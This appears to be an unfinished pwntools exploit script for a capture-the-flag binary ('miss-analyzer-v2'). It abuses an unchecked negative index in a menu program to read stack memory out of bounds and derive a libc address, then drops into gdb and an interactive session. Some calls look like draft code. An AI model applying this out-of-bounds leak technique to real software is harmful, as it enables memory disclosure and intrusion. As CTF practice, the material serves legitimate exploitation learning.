from pwn import *
context.arch = 'amd64'
context.log_level = 'info'
elf = ELF('./generator_patched')
libc = ELF('./libc.so.6')

if 'REMOTE' in args:
    r = remote('miss-analyzer-v2.challs.sekai.team', 1337)
else:
    r = process(elf.path)

def create_area(x, y, width, height, url, title):
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'x coordinate: ', str(x).encode())
    r.sendlineafter(b'y coordinate: ', str(y).encode())
    r.sendlineafter(b'width: ', str(width).encode())
    r.sendlineafter(b'height: ', str(height).encode())
    r.sendlineafter(b'redirect URL: ', url)
    r.sendlineafter(b'title: ', title)

def remove_area(area_num):
    r.sendlineafter(b'choice: ', b'2')
    # No validation on area_num!
    r.sendlineafter(b'): ', str(area_num).encode())
    print(r.recv())
def edit_area(area_num):
    """Edit an area and capture the leaked 'current' values"""
    r.sendlineafter(b'choice: ', b'3')
    r.sendlineafter(b'): ', str(area_num).encode())
    
    # Capture the leaked x coordinate
    r.recvuntil(b'(current: ')
    x_leak = int(r.recvuntil(b'):', drop=True))
    r.sendline(str(x_leak).encode())
    
    # Capture the leaked y coordinate  
    r.recvuntil(b'(current: ')
    y_leak = int(r.recvuntil(b'):', drop=True))
    r.sendline(str(y_leak).encode())
    
    # Capture the leaked width
    r.recvuntil(b'(current: ')
    width_leak = int(r.recvuntil(b'):', drop=True))
    r.sendline(str(width_leak).encode())
    
    # Capture the leaked height
    r.recvuntil(b'(current: ')
    height_leak = int(r.recvuntil(b'):', drop=True))
    r.sendline(str(height_leak).encode())
    
    # URL and title
    r.recvuntil(b'(current: ')
    r.sendline(b'dummy')
    
    r.recvuntil(b'(current: ')
    r.sendline(b'dummy')
    values = [x_leak, y_leak, width_leak, height_leak]
    values = [hex(i) for i in values]
    print(values)
    return values

def generate_imagemap():
    r.sendlineafter(b'choice: ', b'4')
    r.recvuntil(b'[imagemap]\n')
    data = r.recvuntil(b'[/imagemap]', drop=True)
    print(data)

r.sendlineafter(b'image URL: ', b'A'*200)

log.info("Creating a few normal areas first...")

create_area(p64(elf.got['puts']), 0, 0, 0, b"0", b"0",)

log.info("Using negative index in edit_area to access memory before the buffer!")

leaks = edit_area(-3)
print(leaks)
print(hex(int(leaks[3], 16)-0x21aaa0))
generate_imagemap()
gdb.attach(r)
# The areas buffer v6 is at [rbp-0x2600]
# Before this on the stack we have:
# - Saved registers
# - Return addresses  
# - Other local variables from calling functions
# 
# Using negative index -1 means: v6 + 544*(-1) = v6 - 544
# This accesses 544 bytes BEFORE the areas buffer!

# Let's try several negative indices to scan backwards through the stack
r.interactive()